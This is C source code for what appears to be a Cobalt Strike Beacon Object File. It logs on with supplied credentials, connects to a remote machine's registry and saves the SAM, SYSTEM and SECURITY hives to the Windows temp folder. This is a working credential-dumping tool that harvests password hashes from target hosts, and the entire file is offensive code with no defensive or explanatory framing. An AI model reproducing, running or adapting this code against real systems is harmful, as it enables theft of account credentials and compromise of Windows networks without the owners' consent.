#pragma comment(lib, "advapi32.lib")
#include "beacon.h"

DFR(Advapi32, LogonUserA);
DFR(Advapi32, RegConnectRegistryA);
DFR(Advapi32, RegOpenKeyExA);
DFR(Advapi32, RegSaveKeyA);
DFR(KERNEL32, GetLastError);

#define LogonUserA Advapi32$LogonUserA
#define RegConnectRegistryA Advapi32$RegConnectRegistryA
#define RegOpenKeyExA Advapi32$RegOpenKeyExA
#define RegSaveKeyA Advapi32$RegSaveKeyA
#define GetLastError KERNEL32$GetLastError

void go(char *args, int len)
{
    datap dpParser;
    LPCSTR lpszTarget;
    LPCSTR lpszDomain;
    LPCSTR lpszUser;
    LPCSTR lpszPassword;
    HANDLE hToken;
    HKEY hklm;
    HKEY hkey;
    DWORD dwResult;
    const char *hives[] = {"SAM", "SYSTEM", "SECURITY"};
    const char *files[] = {"C:\\windows\\temp\\sam.out", "C:\\windows\\temp\\system.out", "C:\\windows\\temp\\security.out"};

    BeaconDataParse(&dpParser, args, len);
    lpszTarget = BeaconDataExtract(&dpParser, NULL);
    lpszDomain = BeaconDataExtract(&dpParser, NULL);
    lpszUser = BeaconDataExtract(&dpParser, NULL);
    lpszPassword = BeaconDataExtract(&dpParser, NULL);

    if (LogonUserA(lpszUser, lpszDomain, lpszPassword, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken) == 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "[!] Error: 0x%08X", GetLastError());
        return;
    }

    BeaconUseToken(hToken);

    dwResult = RegConnectRegistryA(lpszTarget, HKEY_LOCAL_MACHINE, &hklm);
    if (dwResult != 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to connect to registry, 0x%08X\n", dwResult);
        return;
    }

    for (int i = 0; i < 3; i++)
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Dumping %s to %s\n", hives[i], files[i]);
        dwResult = RegOpenKeyExA(hklm, hives[i], REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_READ, &hkey);

        if (dwResult != 0)
        {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open key, 0x%08X\n", dwResult);
            return;
        }

        dwResult = RegSaveKeyA(hkey, files[i], NULL);
        if (dwResult != 0)
        {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to save key, 0x%08X\n", dwResult);
            return;
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Done! Files are in temp");
}